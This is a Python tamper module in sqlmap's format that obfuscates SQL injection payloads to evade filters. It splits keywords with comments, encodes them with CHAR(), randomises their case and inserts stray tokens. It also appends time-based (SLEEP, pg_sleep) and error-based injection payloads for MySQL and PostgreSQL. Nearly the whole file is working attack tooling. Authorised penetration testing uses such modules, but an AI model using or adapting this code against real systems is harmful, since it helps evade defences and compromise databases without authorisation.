import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    """Ensure dependencies are met."""
    pass

def tamper(payload, **kwargs):
    """
    Obfuscates SQL payloads and adds database-specific compatibility patterns
    for MySQL and PostgreSQL.
    """
    if not payload:
        return payload

    # Function to apply multiple obfuscation techniques
    def obfuscate_keyword(keyword):
        techniques = [
            lambda k: "/**/".join(k),  # Comment-based obfuscation
            lambda k: "".join([f"CHAR({ord(c)})" for c in k]),  # CHAR() encoding (MySQL)
            lambda k: "||".join(k),  # String concatenation (PostgreSQL)
            lambda k: "".join([c.upper() if random.choice([True, False]) else c.lower() for c in k]),  # Case randomization
        ]
        return random.choice(techniques)(keyword)

    # SQL keywords to obfuscate
    keywords = ["SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "INSERT", "UPDATE", "DELETE"]
    for keyword in keywords:
        if keyword in payload:
            payload = payload.replace(keyword, obfuscate_keyword(keyword))

    # Add multi-database payload patterns
    # Randomly include MySQL or PostgreSQL-specific comments and clauses
    db_specific_payloads = [
        # MySQL-specific time-based injection
        " AND SLEEP(5)--",  
        # PostgreSQL-specific time-based injection
        " AND pg_sleep(5)--",  
        # MySQL-specific error-based payload
        " AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS SIGNED)--",
        # PostgreSQL-specific error-based payload
        " AND 1=CAST((SELECT COUNT(*) FROM pg_catalog.pg_tables) AS INT)--"
    ]
    if random.choice([True, False]):  # Randomly decide whether to include DB-specific payload
        payload += random.choice(db_specific_payloads)

    # Insert random harmless tokens
    tokens = ["--", ";", "%20", "/*random*/", " "]
    for _ in range(random.randint(1, 3)):
        position = random.randint(0, len(payload) - 1)
        token = random.choice(tokens)
        payload = payload[:position] + token + payload[position:]

    return payload
